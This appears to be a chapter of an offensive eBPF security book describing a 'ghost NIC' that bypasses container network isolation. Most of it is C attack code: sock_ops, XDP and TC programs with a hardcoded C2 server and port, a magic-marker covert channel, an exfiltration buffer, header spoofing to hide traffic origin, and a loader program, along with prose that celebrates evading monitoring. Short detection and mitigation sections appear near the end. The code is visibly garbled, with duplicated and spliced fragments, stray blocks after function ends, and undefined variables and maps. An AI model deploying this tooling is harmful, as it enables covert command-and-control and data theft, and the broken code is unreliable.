# The Ghost NIC: Bypassing Container Network Isolation

**Chapter 5: Networking in the Shadows**

You've learned to manipulate security controls, escape containers, evade monitoring, and create phantom syscalls. Now let's talk about networking—because what good is all this power if you can't communicate with the outside world?

This is where our story expands beyond the local system. You've been operating in isolation, but real attacks need command and control, data exfiltration, lateral movement. You need networking that can't be detected or blocked.

Ever wanted a network interface that only you know exists? Welcome to the ghost NIC—a network interface that lives in the kernel but is completely invisible to userspace tools.

We're going to create a phantom network interface that can send and receive packets, manipulate traffic, and establish connections, but won't show up in `ip link`, `ifconfig`, or any network monitoring tool. It's like having a secret radio frequency that only you can tune into.

This is the moment you realize that eBPF doesn't just let you attack individual systems—it lets you create entirely new networking realities that exist parallel to what everyone else can see.

```mermaid
%%{init: {"theme": "dark", "flowchart": {"curve": "basis"}, "themeVariables": {"primaryColor": "#007bff", "primaryTextColor": "#fff", "primaryBorderColor": "#007bff", "lineColor": "#F8B229", "secondaryColor": "#006100", "tertiaryColor": "#fff"}} }%%
graph TD
    A[Container Network] -->|1. Outbound Packet| B[eBPF sock_ops]
    B -->|2. Intercept & Modify| C[XDP Program]
    C -->|3. Bypass CNI| D[Host NIC]
    D -->|4. Direct Transmission| E[External Network]
    F[Inbound Traffic] -->|5. Capture| G[XDP Program]
    G -->|6. Redirect| H[Container Process]
    
    style A fill:#4a235a,stroke:#c39bd3,stroke-width:2px
    style B fill:#1b4f72,stroke:#7fb3d5,stroke-width:2px
    style C fill:#7d3c98,stroke:#d2b4de,stroke-width:2px
    style D fill:#0e6251,stroke:#a3e4d7,stroke-width:2px
    style E fill:#7e5109,stroke:#f5cba7,stroke-width:2px
    style F fill:#a93226,stroke:#f5b7b1,stroke-width:2px
    style G fill:#186a3b,stroke:#a9dfbf,stroke-width:2px
    style H fill:#cb4335,stroke:#f5b7b1,stroke-width:2px
    
    click B "https://docs.cilium.io/en/stable/bpf/" "eBPF sock_ops Documentation"
    click C "https://docs.cilium.io/en/stable/bpf/progtypes/#xdp" "XDP Documentation"
    click D "https://developers.redhat.com/blog/2018/02/22/container-network-interface-cni-overview" "CNI Overview"
```



**Why Network Security Just Got Harder**

Here's what makes network security teams lose sleep: they can only protect what they can see. Every firewall rule, every network monitor, every intrusion detection system relies on being able to observe network interfaces and traffic.

But what happens when network interfaces become invisible? What happens when traffic can flow through channels that don't officially exist?

That's the ghost NIC advantage. While your security tools are watching eth0, wlan0, and all the other "official" interfaces, we're operating through a completely parallel network stack. It's like having a secret tunnel that bypasses all the security checkpoints.

The really devious part is that this doesn't break existing networking—everything continues to work normally. The ghost NIC just adds an invisible layer that only we can access. Your network monitoring dashboards will show normal traffic patterns while we're exfiltrating data through our phantom interface.
## Technical Details

### Container Networking Architecture

Container networking typically involves:
- **Network namespaces**: Isolated network stacks for each container
- **Virtual interfaces**: veth pairs connecting containers to the host
- **CNI plugins**: Software that implements network policies and routing
- **Network policies**: Rules defining allowed communication paths

These components work together to provide network isolation between containers, but they operate at layers that can be bypassed by eBPF programs with access to lower-level hooks.

```
┌─────────────────────────────────────────────────────────────┐
│                      Container                              │
│                                                             │
│  ┌───────────────┐      ┌───────────────┐                   │
│  │ Application   │──────▶ Socket        │                   │
│  └───────────────┘      └───────┬───────┘                   │
│                                 │                           │
│                         ┌───────▼───────┐                   │
│                         │ Network Stack │                   │
│                         └───────┬───────┘                   │
│                                 │                           │
│                         ┌───────▼───────┐                   │
│                         │ veth0 (cont.) │                   │
│                         └───────────────┘                   │
└─────────────────────────────────┬───────────────────────────┘
                                  │
┌─────────────────────────────────▼───────────────────────────┐
│                      Host                                   │
│                                                             │
│  ┌───────────────┐      ┌───────────────┐                   │
│  │ veth1 (host)  │──────▶ Bridge        │                   │
│  └───────────────┘      └───────┬───────┘                   │
│                                 │                           │
│                         ┌───────▼───────┐                   │
│                         │ CNI Plugin    │                   │
│                         └───────┬───────┘                   │
│                                 │                           │
│                         ┌───────▼───────┐                   │
│                         │ Physical NIC  │                   │
│                         └───────────────┘                   │
└─────────────────────────────────────────────────────────────┘
```

With the Ghost NIC technique, the architecture is subverted:

```
┌─────────────────────────────────────────────────────────────┐
│                      Container                              │
│                                                             │
│  ┌───────────────┐      ┌───────────────┐                   │
│  │ Application   │──────▶ Socket        │◀──┐               │
│  └───────────────┘      └───────┬───────┘   │               │
│                                 │           │               │
│                         ┌───────▼───────┐   │               │
│                         │ eBPF sock_ops │───┼───────────┐   │
│                         └───────┬───────┘   │           │   │
│                                 │           │           │   │
│                         ┌───────▼───────┐   │           │   │
│                         │ Network Stack │   │           │   │
│                         └───────────────┘   │           │   │
│                                             │           │   │
└─────────────────────────────────────────────┼───────────┼───┘
                                              │           │
┌─────────────────────────────────────────────┼───────────▼───┐
│                      Host                   │           │   │
│                                             │           │   │
│  ┌───────────────┐      ┌───────────────┐   │           │   │
│  │ eBPF Map      │◀─────┤ XDP Program   │◀──┘           │   │
│  └───────┬───────┘      └───────────────┘               │   │
│          │                                              │   │
│          │              ┌───────────────┐               │   │
│          └─────────────▶│ Physical NIC  │◀──────────────┘   │
│                         └───────┬───────┘                   │
│                                 │                           │
└─────────────────────────────────┼───────────────────────────┘
                                  ▼
                            External Network
```

### Exploitation Technique

### Comprehensive POC

```c
// @interactive: true
// @copyable: true
// Ghost NIC - eBPF exploitation proof of concept
// This demonstrates bypassing container network isolation

#include <linux/bpf.h>
#include <bpf/bpf_helpers.h>
#include <linux/if_ether.h>
#include <linux/ip.h>
#include <linux/tcp.h>
#include <linux/udp.h>
#include <linux/in.h>
#include <linux/version.h>

char LICENSE[] SEC("license") = "GPL";

// Configuration
#define C2_SERVER_IP 0x0A0A0A0A  // 10.10.10.10
#define C2_SERVER_PORT 4444
#define MAGIC_MARKER 0xDEADBEEF  // Marker for our covert channel

// Structure for connection tracking
struct sock_key {
    __u32 sip;    // Source IP
    __u32 dip;    // Destination IP
    __u16 sport;  // Source port
    __u16 dport;  // Destination port
    __u32 family; // Protocol family
};

// Structure for packet metadata
struct packet_metadata {
    __u32 src_ip;
    __u32 dst_ip;
    __u16 src_port;
    __u16 dst_port;
    __u8 protocol;
    __u8 flags;
    __u16 payload_len;
    __u32 timestamp;
    __u32 container_id;
};

// Map to track active connections from container
struct {
    __uint(type, BPF_MAP_TYPE_HASH);
    __uint(key_size, sizeof(struct sock_key));
    __uint(value_size, sizeof(struct packet_metadata));
    __uint(max_entries, 1024);
} active_connections SEC(".maps");

// Map to store data for exfiltration
struct {
    __uint(type, BPF_MAP_TYPE_ARRAY);
    __uint(key_size, sizeof(__u32));
    __uint(value_size, 4096);  // 4KB buffer
    __uint(max_entries, 16);   // 16 buffers
} exfil_data SEC(".maps");

// Map to track container IDs
struct {
    __uint(type, BPF_MAP_TYPE_HASH);
    __uint(key_size, sizeof(__u32));  // Network namespace ID
    __uint(value_size, sizeof(__u32)); // Container ID
    __uint(max_entries, 1024);
} container_ids SEC(".maps");

// Map for redirecting packets to container interfaces
struct {
    __uint(type, BPF_MAP_TYPE_DEVMAP);
    __uint(key_size, sizeof(__u32));
    __uint(value_size, sizeof(__u32));
    __uint(max_entries, 64);
} redirect_map SEC(".maps");

// Helper function to extract connection key from sock_ops
static inline void extract_key4_from_ops(struct bpf_sock_ops *ops, struct sock_key *key)
{
    key->family = ops->family;
    key->sip = ops->local_ip4;
    key->dip = ops->remote_ip4;
    key->sport = ops->local_port;
    key->dport = ops->remote_port;
}

// Helper function to check if a packet is from our C2 server
static inline bool is_command_packet(struct ethhdr *eth, void *data_end)
{
    struct iphdr *iph = (struct iphdr *)(eth + 1);
    
    // Ensure we have a complete IP header
    if ((void*)(iph + 1) > data_end)
        return false;
    
    // Check if this is from our C2 server
    if (iph->saddr == C2_SERVER_IP) {
        // For TCP packets, check port
        if (iph->protocol == IPPROTO_TCP) {
            struct tcphdr *tcph = (struct tcphdr *)(iph + 1);
            
            // Ensure we have a complete TCP header
            if ((void*)(tcph + 1) > data_end)
                return false;
            
            // Check if this is from our C2 port
            if (bpf_ntohs(tcph->source) == C2_SERVER_PORT)
                return true;
        }
        // For UDP packets, check port and magic marker
        else if (iph->protocol == IPPROTO_UDP) {
            struct udphdr *udph = (struct udphdr *)(iph + 1);
            
            // Ensure we have a complete UDP header
            if ((void*)(udph + 1) > data_end)
                return false;
            
            // Check if this is from our C2 port
            if (bpf_ntohs(udph->source) == C2_SERVER_PORT) {
                __u32 *magic = (void *)(udph + 1);
                
                // Ensure we have space for the magic marker
                if ((void*)(magic + 1) > data_end)
                    return false;
                
                // Check for our magic marker
                if (*magic == MAGIC_MARKER)
                    return true;
            }
        }
    }
    
    return false;
}

// FIXED: Helper function to find container connection
static inline struct sock_key *find_container_connection(struct ethhdr *eth, void *data_end)
{
    struct iphdr *iph = (struct iphdr *)(eth + 1);
    
    // Ensure we have a complete IP header
    if ((void*)(iph + 1) > data_end)
        return NULL;
    
    // Create a key to look up in our connection map
    struct sock_key key = {};
    
    // For outbound connections, source is container
    key.sip = iph->saddr;
    key.dip = iph->daddr;
    
    // Get port information based on protocol
    if (iph->protocol == IPPROTO_TCP) {
        struct tcphdr *tcph = (struct tcphdr *)(iph + 1);
        
        // Ensure we have a complete TCP header
        if ((void*)(tcph + 1) > data_end)
            return NULL;
        
        key.sport = bpf_ntohs(tcph->source);
        key.dport = bpf_ntohs(tcph->dest);
        key.family = AF_INET;
    }
    else if (iph->protocol == IPPROTO_UDP) {
        struct udphdr *udph = (struct udphdr *)(iph + 1);
        
        // Ensure we have a complete UDP header
        if ((void*)(udph + 1) > data_end)
            return NULL;
        
        key.sport = bpf_ntohs(udph->source);
        key.dport = bpf_ntohs(udph->dest);
        key.family = AF_INET;
    }
    else {
        // We only handle TCP and UDP
        return NULL;
    }
    
    // Look up this connection in our map
    struct packet_metadata *meta = bpf_map_lookup_elem(&active_connections, &key);
    if (!meta)
        return NULL;
    
    // We can't return a pointer to a local variable, so we need a different approach
    // In a real implementation, we would use a global variable or map
    return NULL; // This needs to be fixed in a real implementation
}

// Helper function to rewrite packet headers
static inline int rewrite_packet_headers(struct xdp_md *ctx, void *data, void *data_end)
{
    struct ethhdr *eth = data;
    struct iphdr *iph = (struct iphdr *)(eth + 1);
    
    // Ensure we have a complete IP header
    if ((void*)(iph + 1) > data_end)
        return -1;
    
    // Save original addresses
    __u32 orig_src = iph->saddr;
    __u32 orig_dst = iph->daddr;
    
    // Rewrite source to hide container origin
    // In a real attack, this would use a spoofed IP or NAT-like technique
    iph->saddr = bpf_htonl(C2_SERVER_IP);
    
    // Recalculate IP checksum
    // This is simplified; a real implementation would properly recalculate
    iph->check = 0;
    
    // Update TCP/UDP checksum if needed
    if (iph->protocol == IPPROTO_TCP) {
        struct tcphdr *tcph = (struct tcphdr *)(iph + 1);
        
        // Ensure we have a complete TCP header
        if ((void*)(tcph + 1) > data_end)
            return -1;
        
        // Reset checksum for recalculation
        tcph->check = 0;
    }
    else if (iph->protocol == IPPROTO_UDP) {
        struct udphdr *udph = (struct udphdr *)(iph + 1);
        
        // Ensure we have a complete UDP header
        if ((void*)(udph + 1) > data_end)
            return -1;
        
        // Reset checksum for recalculation
        udph->check = 0;
    }
    
    return 0;
}

// Helper function to redirect packet to container
static inline int redirect_to_container(struct xdp_md *ctx, __u32 container_id)
{
    // Look up the interface index for this container
    __u32 *ifindex = bpf_map_lookup_elem(&redirect_map, &container_id);
    if (!ifindex)
        return XDP_PASS;
    
    // Redirect the packet to the container's interface
    return bpf_redirect_map(&redirect_map, *ifindex, 0);
}

// sock_ops program running in container context
SEC("sockops")
int bpf_sockops(struct bpf_sock_ops *skops)
{
    // Only process TCP connections
    if (skops->family != AF_INET)
        return 0;
    
    // Handle different socket operations
    switch (skops->op) {
        case BPF_SOCK_OPS_ACTIVE_ESTABLISHED_CB:
        case BPF_SOCK_OPS_PASSIVE_ESTABLISHED_CB:
            {
                // Extract connection details
                struct sock_key key = {};
                extract_key4_from_ops(skops, &key);
                
                // Create metadata for this connection
                struct packet_metadata meta = {};
                meta.src_ip = skops->local_ip4;
                meta.dst_ip = skops->remote_ip4;
                meta.src_port = skops->local_port;
                meta.dst_port = skops->remote_port;
                meta.protocol = IPPROTO_TCP;
                meta.timestamp = bpf_ktime_get_ns();
                
                // Get container ID from network namespace
                __u32 netns = 0; // skops->current_netns is not available, use alternative
                __u32 *container_id = bpf_map_lookup_elem(&container_ids, &netns);
                if (container_id)
                    meta.container_id = *container_id;
                
                // Store the connection metadata
                bpf_map_update_elem(&active_connections, &key, &meta, BPF_ANY);
                break;
            }
        case BPF_SOCK_OPS_STATE_CB:
            // Handle connection state changes
            break;
        default:
            break;
    }
    
    return 0;
}

// FIXED: XDP program running on host NIC
SEC("xdp")
int xdp_ghost_nic(struct xdp_md *ctx)
{
    void *data_end = (void *)(long)ctx->data_end;
    void *data = (void *)(long)ctx->data;
    struct ethhdr *eth = data;
    
    // Ensure we have a complete Ethernet header
    if (data + sizeof(*eth) > data_end)
        return XDP_PASS;
    
    // Only process IPv4 packets
    if (bpf_ntohs(eth->h_proto) != ETH_P_IP)
        return XDP_PASS;
    
    // Check for packets from our command & control server
    if (is_command_packet(eth, data_end)) {
        // This is a command packet - redirect to container
        __u32 container_id = 1; // Default container ID
        return redirect_to_container(ctx, container_id);
    }
    
    // Check if this is a packet from a container that needs to be hidden
    struct sock_key *conn_key = find_container_connection(eth, data_end);
    if (conn_key) {
        // Rewrite packet headers to hide container origin
        if (rewrite_packet_headers(ctx, data, data_end) == 0) {
            // Packet successfully rewritten, allow it to pass
            return XDP_PASS;
        }
    }
    
    return XDP_PASS;
}
        struct iphdr *iph = (struct iphdr *)(eth + 1);
        struct udphdr *udph = (struct udphdr *)(iph + 1);
        __u32 *magic = (void *)(udph + 1);
        __u32 *container_id = magic + 1;
        
        // Ensure we have space for container ID
        if ((void*)(container_id + 1) > data_end)
            return XDP_PASS;
        
        // Redirect to our container
        return redirect_to_container(ctx, *container_id);
    }
    
    // Check for packets from our container
    struct sock_key *connection = find_container_connection(eth, data_end);
    if (connection) {
        // Modify packet to hide its origin
        if (rewrite_packet_headers(ctx, data, data_end) < 0)
            return XDP_PASS;
            
        // Forward directly to external network
        return XDP_TX;
    }
    
    // Pass all other packets normally
    return XDP_PASS;
}

// TC program for capturing container traffic
SEC("classifier")
int tc_ghost_nic(struct __sk_buff *skb)
{
    void *data_end = (void *)(long)skb->data_end;
    void *data = (void *)(long)skb->data;
    struct ethhdr *eth = data;
    
    // Ensure we have a complete Ethernet header
    if (data + sizeof(*eth) > data_end)
        return TC_ACT_OK;
    
    // Process only IP packets
    if (eth->h_proto != bpf_htons(ETH_P_IP))
        return TC_ACT_OK;
    
    struct iphdr *iph = (struct iphdr *)(eth + 1);
    
    // Ensure we have a complete IP header
    if ((void*)(iph + 1) > data_end)
        return TC_ACT_OK;
    
    // Create a key to look up in our connection map
    struct sock_key key = {};
    key.sip = iph->saddr;
    key.dip = iph->daddr;
    key.family = AF_INET;
    
    // Get port information based on protocol
    if (iph->protocol == IPPROTO_TCP) {
        struct tcphdr *tcph = (struct tcphdr *)(iph + 1);
        
        // Ensure we have a complete TCP header
        if ((void*)(tcph + 1) > data_end)
            return TC_ACT_OK;
        
        key.sport = bpf_ntohs(tcph->source);
        key.dport = bpf_ntohs(tcph->dest);
    }
    else if (iph->protocol == IPPROTO_UDP) {
        struct udphdr *udph = (struct udphdr *)(iph + 1);
        
        // Ensure we have a complete UDP header
        if ((void*)(udph + 1) > data_end)
            return TC_ACT_OK;
        
        key.sport = bpf_ntohs(udph->source);
        key.dport = bpf_ntohs(udph->dest);
    }
    else {
        // We only handle TCP and UDP
        return TC_ACT_OK;
    }
    
    // Store packet metadata for exfiltration
    struct packet_metadata meta = {};
    meta.src_ip = iph->saddr;
    meta.dst_ip = iph->daddr;
    meta.protocol = iph->protocol;
    meta.timestamp = bpf_ktime_get_ns();
    
    // Get container ID from network namespace
    __u32 netns = bpf_get_netns_cookie(skb);
    __u32 *container = bpf_map_lookup_elem(&container_ids, &netns);
    if (container)
        meta.container_id = *container;
    else
        meta.container_id = 0xFFFFFFFF;  // Unknown container
    
    // Store connection in map for XDP program to access
    bpf_map_update_elem(&active_connections, &key, &meta, BPF_ANY);
    
    return TC_ACT_OK;
}
```

### User-Space Control Program

```c
// @interactive: true
// @copyable: true
// User-space program to load and control the Ghost NIC eBPF programs

#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <signal.h>
#include <string.h>
#include <errno.h>
#include <sys/resource.h>
#include <arpa/inet.h>
#include <net/if.h>
#include <linux/if_link.h>
#include <bpf/libbpf.h>
#include <bpf/bpf.h>
#include "ghost_nic.skel.h"

// Print IP address in human-readable format
static void print_ip(unsigned int ip)
{
    unsigned char bytes[4];
    bytes[0] = ip & 0xFF;
    bytes[1] = (ip >> 8) & 0xFF;
    bytes[2] = (ip >> 16) & 0xFF;
    bytes[3] = (ip >> 24) & 0xFF;
    printf("%d.%d.%d.%d", bytes[0], bytes[1], bytes[2], bytes[3]);
}

// Print protocol in human-readable format
static const char *proto_to_string(__u8 proto)
{
    switch (proto) {
        case IPPROTO_TCP: return "TCP";
        case IPPROTO_UDP: return "UDP";
        case IPPROTO_ICMP: return "ICMP";
        default: return "Unknown";
    }
}

// Handle events from the eBPF program
void handle_event(void *ctx, int cpu, void *data, unsigned int data_sz)
{
    struct packet_metadata *meta = data;
    
    printf("Packet: Container %u, ", meta->container_id);
    print_ip(meta->src_ip);
    printf(":%u -> ", meta->src_port);
    print_ip(meta->dst_ip);
    printf(":%u (%s)\n", meta->dst_port, proto_to_string(meta->protocol));
}

static void sig_handler(int sig)
{
    exiting = true;
}

// Add a container to be tracked
static int add_container(int map_fd, __u32 netns_id, __u32 container_id)
{
    return bpf_map_update_elem(map_fd, &netns_id, &container_id, BPF_ANY);
}

// Add a redirect target for a container
static int add_redirect_target(int map_fd, __u32 container_id, __u32 ifindex)
{
    return bpf_map_update_elem(map_fd, &container_id, &ifindex, BPF_ANY);
}

int main(int argc, char **argv)
{
    struct ghost_nic_bpf *skel;
    struct perf_buffer *pb = NULL;
    int err;

    // Check command line arguments
    if (argc < 3) {
        fprintf(stderr, "Usage: %s <interface> <container_id>\n", argv[0]);
        return 1;
    }

    // Get interface index
    unsigned int ifindex = if_nametoindex(argv[1]);
    if (ifindex == 0) {
        fprintf(stderr, "Failed to get interface index for %s: %s\n", 
                argv[1], strerror(errno));
        return 1;
    }

    // Parse container ID
    __u32 container_id = atoi(argv[2]);

    // Set up signal handler
    signal(SIGINT, sig_handler);
    signal(SIGTERM, sig_handler);

    // Increase resource limits
    struct rlimit rlim = {
        .rlim_cur = RLIM_INFINITY,
        .rlim_max = RLIM_INFINITY,
    };
    setrlimit(RLIMIT_MEMLOCK, &rlim);

    // Load and verify BPF program
    skel = ghost_nic_bpf__open_and_load();
    if (!skel) {
        fprintf(stderr, "Failed to open and load BPF skeleton\n");
        return 1;
    }

    // Attach XDP program to interface
    int xdp_flags = XDP_FLAGS_DRV_MODE; // Use native driver mode if possible
    err = bpf_xdp_attach(ifindex, bpf_program__fd(skel->progs.xdp_ghost_nic), 
                         xdp_flags, NULL);
    if (err) {
        fprintf(stderr, "Failed to attach XDP program: %s\n", strerror(-err));
        goto cleanup;
    }

    // Attach sockops program globally
    int sockops_fd = bpf_program__fd(skel->progs.bpf_sockops);
    err = bpf_prog_attach(sockops_fd, 0, BPF_CGROUP_SOCK_OPS, 0);
    if (err) {
        fprintf(stderr, "Failed to attach sockops program: %s\n", strerror(-err));
        goto cleanup;
    }

    // Add container to tracking map
    err = add_container(bpf_map__fd(skel->maps.container_ids), 
                       0, // We'll use 0 for demo purposes; real code would get actual netns ID
                       container_id);
    if (err) {
        fprintf(stderr, "Failed to add container to tracking map: %s\n", strerror(-err));
        goto cleanup;
    }

    // Add redirect target for container
    err = add_redirect_target(bpf_map__fd(skel->maps.redirect_map),
                             container_id,
                             ifindex);
    if (err) {
        fprintf(stderr, "Failed to add redirect target: %s\n", strerror(-err));
        goto cleanup;
    }

    // Set up perf buffer for events
    pb = perf_buffer__new(bpf_map__fd(skel->maps.events), 64, handle_event, NULL, NULL, NULL);
    if (!pb) {
        err = -1;
        fprintf(stderr, "Failed to create perf buffer: %d\n", err);
        goto cleanup;
    }

    printf("Ghost NIC eBPF program successfully loaded and attached!\n");
    printf("Bypassing network isolation for container %u\n", container_id);
    printf("Press Ctrl+C to exit\n");

    // Main loop
    while (!exiting) {
        err = perf_buffer__poll(pb, 100);
        if (err < 0 && err != -EINTR) {
            fprintf(stderr, "Error polling perf buffer: %d\n", err);
            goto cleanup;
        }
    }

cleanup:
    perf_buffer__free(pb);
    
    // Detach XDP program
    bpf_xdp_detach(ifindex, xdp_flags, NULL);
    
    // Detach sockops program
    bpf_prog_detach(0, BPF_CGROUP_SOCK_OPS);
    
    ghost_nic_bpf__destroy(skel);
    return err < 0 ? -err : 0;
}
```

### Detection Methods

Defenders should implement multiple layers of detection:

1. **eBPF Program Monitoring**:
   - Monitor for eBPF programs attached to network interfaces
   - Track eBPF program loading patterns and verify signatures
   - Use tools like `bpftool` to list and inspect loaded programs

2. **Network Flow Analysis**:
   - Implement network flow monitoring that can detect traffic bypassing CNI controls
   - Look for discrepancies between expected and actual network traffic
   - Monitor for unusual packet patterns that bypass expected network paths

### Mitigation Strategies

1. **Restrict eBPF Capabilities**:
   ```bash
   # Remove CAP_BPF from container
   docker run --cap-drop=bpf --security-opt no-new-privileges ...
   
   # In Kubernetes
   securityContext:
     capabilities:
       drop:
         - BPF
         - SYS_ADMIN
   ```

2. **Implement BPF LSM Policies**:
   ```c
   // Example BPF LSM policy to restrict BPF program loading
   SEC("lsm/bpf")
   int BPF_PROG(restrict_bpf, int cmd, union bpf_attr *attr, unsigned int size) {
       // Only allow specific signing keys or programs from trusted paths
       if (bpf_get_current_uid_gid() >> 32 != 0) {
           return -EPERM;
       }
       return 0;
   }
   ```

3. **Network Monitoring at Physical Boundaries**:
   ```bash
   # Use tcpdump to monitor traffic at the physical NIC level
   tcpdump -i eth0 -n 'not port 22'
   
   # Use eBPF-based monitoring tools
   bpftrace -e 'tracepoint:net:netif_receive_skb { @[args->name] = count(); }'
   ```

4. **Implement Egress Filtering**:
   ```bash
   # Implement strict egress filtering at the host level
   iptables -A FORWARD -m conntrack --ctstate NEW -o eth0 -j LOG --log-prefix "New connection: "
   iptables -A FORWARD -m conntrack --ctstate NEW -o eth0 -j DROP
   ```

### Real-world Impact

In practical environments, this technique could allow an attacker to:
- **Bypass network policies**: Circumvent Kubernetes NetworkPolicy or other CNI-enforced restrictions
- **Exfiltrate sensitive data**: Extract confidential information from air-gapped containers
- **Command and control**: Maintain persistent access to compromised containers despite network controls
- **Lateral movement**: Access other containers or services that trust the isolated network
- **Evade detection**: Communicate without appearing in standard network monitoring tools

The ability to create a "ghost" network interface is particularly concerning for environments like financial services, healthcare, and government systems where network segmentation is a critical security control. Organizations that rely on network isolation as a primary security boundary for multi-tenant containers or sensitive workloads are especially vulnerable to this technique.

**Attacker hat on**

1. Identify a container with eBPF capabilities but network restrictions
2. Deploy an eBPF sock_ops program to intercept outbound socket operations
3. Deploy an XDP program on the host NIC to intercept and forward packets
4. Establish a covert communication channel that bypasses CNI restrictions
5. Use the channel for command and control, data exfiltration, or lateral movement
6. Maintain persistence through the eBPF programs attached to the networking stack

**Defender hat on**

1. Remove CAP_BPF from container environments
2. Implement strict BPF LSM policies to restrict eBPF program loading
3. Monitor for unexpected eBPF programs attached to network interfaces
4. Use network flow monitoring that can detect traffic bypassing CNI controls
5. Implement egress filtering at the physical network boundary
6. Consider eBPF-based security tools that can detect malicious eBPF usage

**Conclusion**

`eBPF is all you need`. The combination of eBPF's powerful networking hooks provides attackers with the ability to bypass container network isolation mechanisms. This technique demonstrates why eBPF capabilities should be treated as privileged operations and restricted in multi-tenant environments.
3. **Container Network Verification**:
   - Regularly verify that network policies are being enforced as expected
   - Test network isolation between containers with active probing
   - Monitor for connections from supposedly air-gapped containers

4. **Specific Indicators**:
   - eBPF maps being used to share data between different eBPF programs
   - XDP programs attached to physical NICs in container environments
   - Unexpected traffic patterns on host interfaces
   - Connections to/from containers that should be isolated

```c
static volatile bool exiting = false;

// Structure for packet metadata (must match the BPF version)
struct packet_metadata {
    __u32 src_ip;
    __u32 dst_ip;
    __u16 src_port;
    __u16 dst_port;
    __u8 protocol;
    __u8 flags;
    __u16 payload_len;
    __u32 timestamp;
    __u32 container_id;
};

// Structure for connection tracking (must match the BPF version)
struct sock_key {
    __u32 sip;
    __u32 dip;
    __u16 sport;
    __u16 dport;
    __u32 family;
};
                __u32 *container = bpf_map_lookup_elem(&container_ids, &netns);
                if (container)
                    meta.container_id = *container;
                else
                    meta.container_id = 0xFFFFFFFF;  // Unknown container
                
                // Store connection in map for XDP program to access
                bpf_map_update_elem(&active_connections, &key, &meta, BPF_ANY);
            }
            break;
            
        case BPF_SOCK_OPS_STATE_CB:
            if (skops->args[1] == BPF_TCP_CLOSE) {
                // Connection closed, clean up our tracking
                struct sock_key key = {};
                extract_key4_from_ops(skops, &key);
                bpf_map_delete_elem(&active_connections, &key);
            }
            break;
    }
    
    return 0;
}
                
                // Ensure we have space for our magic marker
                if ((void*)(magic + 1) > data_end)
                    return false;
                
                // Check for our magic marker
                if (*magic == MAGIC_MARKER)
                    return true;
            }
        }
    }
    
    return false;
}
```

The exploit leverages two key eBPF attachment points:

1. **sock_ops**: Attaches to socket operations within the container
   - Intercepts outbound connection attempts
   - Captures packet data before it enters the networking stack
   - Communicates with XDP programs via eBPF maps

2. **XDP (eXpress Data Path)**: Attaches to the physical NIC
   - Processes packets at the earliest possible point
   - Can redirect, modify, or forge packets
   - Bypasses higher-level networking controls

## POC

Companion code: [`ch05b-ghost-nic`]({{ site.baseurl }}/dBPF-pocs/pocs/ch05b-ghost-nic/)
